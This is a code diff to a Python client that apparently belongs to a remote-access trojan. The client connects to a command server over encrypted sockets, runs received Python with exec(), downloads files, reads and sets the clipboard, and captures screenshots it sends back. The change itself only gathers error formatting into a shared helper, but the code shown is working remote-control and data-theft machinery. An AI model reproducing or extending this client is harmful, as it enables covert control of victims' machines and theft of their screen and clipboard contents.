@@ -106,6 +106,23 @@ def public_bytes(publicKey):
     return serializedPublic
 
 
+def errors(ERROR, line=True):
+    error_class = ERROR.__class__.__name__
+    error_msg = '%s' % error_class
+    try:
+        error_msg += ': {0}'.format(ERROR.args[0])
+    except:
+        error_msg += ':'
+    if line:
+        try:
+            _, _, tb = sys.exc_info()
+            line_number = traceback.extract_tb(tb)[-1][1]
+            error_msg += ' (line {0})'.format(line_number)
+        except:
+            pass
+    return error_msg
+
+
 def kill(proc_pid):
     """ Kill Process by ID """
     process = psutil.Process(proc_pid)
@@ -157,8 +174,8 @@ class Client(object):
         """ Create a socket """
         try:
             self.socket = socket.socket()
-        except socket.error as e:
-            logging.error("Socket creation error" + str(e))
+        except Exception as e:
+            logging.error(errors(e))
             return
         return
 
@@ -166,8 +183,8 @@ class Client(object):
         """ Connect to a remote socket using RSA and agreeing on a AES key"""
         try:
             self.socket.connect((self.serverHost, self.serverPort))
-        except socket.error as e:
-            logging.error("Socket connection error: " + str(e))
+        except Exception as e:
+            logging.error(errors(e))
             time.sleep(5)
             raise
         try:
@@ -195,7 +212,7 @@ class Client(object):
             self.send(socket.gethostname().encode())
             os.chdir(os.path.dirname(sys.argv[0]))
         except Exception as e:
-            logging.error(e)
+            logging.error(errors(e))
 
     def recvall(self, n):
         """ Helper function to recv n bytes or return None if EOF is hit
@@ -248,22 +265,11 @@ class Client(object):
                     redirected_output = sys.stdout = StringIO()
                     try:
                         exec(command)
-                    except SyntaxError as e:
-                        error_class = e.__class__.__name__
-                        detail = e.args[0]
-                        line_number = e.lineno
+                        error = None
                     except Exception as e:
-                        error_class = e.__class__.__name__
-                        detail = e.args[0]
-                        _, _, tb = sys.exc_info()
-                        line_number = traceback.extract_tb(tb)[-1][1]
+                        error = errors(e, line=False)
                     finally:
                         sys.stdout = old_stdout
-                    try:
-                        error = "%s: %s (line %d)" % (error_class, detail, line_number)
-                        del line_number
-                    except Exception:
-                        error = None
                     self.send(json.dumps([redirected_output.getvalue(), error]).encode())
                 continue
 
@@ -318,7 +324,7 @@ class Client(object):
                     with open(data[2], 'wb') as f:
                         f.write(r.content)
                 except Exception as e:
-                    self.send('Error downloading file: {}\n'.format(str(e)).encode())
+                    self.send('Error downloading file: {}\n'.format(errors(e, line=False)).encode())
                     continue
                 self.send(b'Download Successful')
                 continue
@@ -328,9 +334,7 @@ class Client(object):
                     pyperclip.copy(data[1])
                     self.send(b'Copied Successfully')
                 except Exception as e:
-                    error_class = e.__class__.__name__
-                    detail = e.args[0]
-                    self.send('{0}: {1}'.format(error_class, detail).encode())
+                    self.send(errors(e).encode())
                 continue
 
             if data[0] == '--u':
@@ -345,11 +349,9 @@ class Client(object):
                 try:
                     pyscreeze.screenshot(_file)
                 except Exception as e:
-                    error_class = e.__class__.__name__
-                    detail = e.args[0]
                     self.send(b'<ERROR>')
                     self.receive()
-                    self.send('{0}: {1}'.format(error_class, detail).encode())
+                    self.send(errors(e).encode())
                     continue
                 with open(_file, 'rb') as f:
                     self.send(f.read())
@@ -394,9 +396,7 @@ class Client(object):
                 try:
                     self.send(pyperclip.paste().encode())
                 except Exception as e:
-                    error_class = e.__class__.__name__
-                    detail = e.args[0]
-                    self.send('{0}: {1}'.format(error_class, detail).encode())
+                    self.send(errors(e).encode())
                 continue
 
             if data[0] == '--r':
@@ -467,12 +467,8 @@ def main():
     try:
         client.receive_commands()
     except Exception as e:
-        error_class = e.__class__.__name__
-        try:
-            detail = e.args[0]
-            logging.critical('{0} in main: {1}'.format(error_class, detail))
-        except:
-            logging.critical('{0} in main.'.format(error_class))
+        logging.critical(errors(e))
+
 
 
 if __name__ == '__main__':
